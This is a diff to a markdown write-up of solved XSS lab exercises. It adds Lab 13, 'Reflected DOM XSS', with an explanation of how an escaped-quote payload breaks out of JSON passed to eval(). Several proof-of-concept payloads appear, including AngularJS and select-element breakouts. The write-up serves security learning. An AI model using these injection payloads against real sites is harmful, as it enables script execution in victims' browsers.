@@ -17,6 +17,7 @@ Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to 
 | 10 | Reflected XSS into a JavaScript string with angle brackets HTML encoded | XSS | ✅ Solved |
 | 11 | DOM XSS in document.write sink using source location.search inside a select element | XSS | ✅ Solved |
 | 12 | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | XSS | ✅ Solved |
+| 13 | Reflected DOM XSS | XSS | ✅ Solved |
 
 ## Key Techniques
 
@@ -114,6 +115,15 @@ Payload: https://...productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=x%20oner
 **Lab 12 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
 ```html
 Payload: {{$on.constructor('alert(1)')()}}
+```
+
+**Lab 13 - Reflected DOM XSS**
+Server echoes user input in JSON response. Client-side JavaScript uses eval() 
+on the response, making it a dangerous sink. Server escapes quotes with backslashes, 
+but the payload `\"-alert(1)}//` exploits this escaping — the `\"` closes the 
+string early, letting injected code execute outside the JSON object.
+```html
+Payload: \"-alert(1)}//
 ```
 
 ## Disclaimer
